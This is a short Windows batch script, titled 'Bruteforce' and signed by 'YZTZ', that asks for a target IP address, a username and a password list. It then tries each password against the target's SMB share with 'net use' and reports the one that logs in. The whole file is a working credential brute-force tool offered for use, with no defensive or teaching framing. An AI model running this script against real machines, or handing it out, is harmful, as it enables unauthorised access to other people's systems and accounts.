@echo off
title Bruteforce
color e

setlocal enabledelayedexpansion

echo by YZTZ

set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

for /f "delims=" %%a in (%wordlist%) do (
  set "pass=%%a"
  call :attempt
)
echo  password not found
pause
exit /b

:success
echo.
echo Password Found! !pass!
net use \\%ip% /d /y >nul 2>&1
pause
exit /b

:attempt
net use \\%ip% /user:%user% "!pass!" >nul 2>&1
echo [ATTEMPT] [!pass!]
if !errorlevel! EQU 0 goto success
exit /b